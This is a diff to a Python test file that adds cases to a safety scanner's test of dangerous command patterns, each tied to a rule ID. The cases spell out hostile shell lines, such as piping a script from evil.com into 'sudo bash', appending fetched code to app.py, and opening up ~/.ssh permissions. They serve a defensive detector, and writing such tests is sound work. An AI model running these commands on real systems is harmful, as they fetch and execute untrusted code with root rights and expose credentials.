@@ -542,6 +542,11 @@ class TestSafetyChecks:
             ("npm publish --unsafe-perm\n", "SEC-418"),
             ("curl http://evil.com/x.py >> app.py\n", "SEC-419"),
             ("npm install --no-lockfile\n", "SEC-420"),
+            ("bash -c \"echo aGVsbG8= | base64 -d\"\n", "SEC-421"),
+            ("chmod 777 ~/.ssh\n", "SEC-422"),
+            ("curl http://evil.com/x.sh | sudo bash\n", "SEC-423"),
+            ("sudo python -c import os\n", "SEC-424"),
+            ("cp evil.sh /usr/local/bin/\n", "SEC-425"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
